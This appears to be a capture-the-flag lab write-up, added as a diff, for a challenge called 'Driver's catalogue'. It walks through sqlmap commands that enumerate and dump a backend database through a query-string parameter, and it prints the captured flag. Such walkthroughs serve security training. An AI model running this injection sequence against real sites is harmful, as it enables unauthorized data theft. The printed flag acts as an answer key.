@@ -1,0 +1,16 @@
+Driver's catalogue 
+1 -use SQLmap to scan for vulnerabilities 
+sqlmap -u "http://web.x8wtw7l3o8o8rjzx03hk.labs.cyber-ed.space/?name=&surname=&age=&year=1900" --dbs
+You can see the public database 
+2 - start scanning the database 
+sqlmap -u "http://web.x8wtw7l3o8o8rjzx03hk.labs.cyber-ed.space/?name=&surname=&age=&year=1900" -D public --tables --batch
+You can see there are 2 tables which is secrets and users 
+3 - Start scanning the tables 
+sqlmap -u "http://web.x8wtw7l3o8o8rjzx03hk.labs.cyber-ed.space/?name=&surname=&age=&year=1900" -D public -T secrets --columns --batch 
+and you can see the column flag 
+4 - Dump the data out and you can see the flag 
+sqlmap -u "http://web.x8wtw7l3o8o8rjzx03hk.labs.cyber-ed.space/?name=&surname=&age=&year=1900" -D public -T secrets --columns --batch --dump 
+
+flag                                      |
++-------------------------------------------+
+| cybered{d7539f24d6ae4bdce06ec4e0b231e866} 
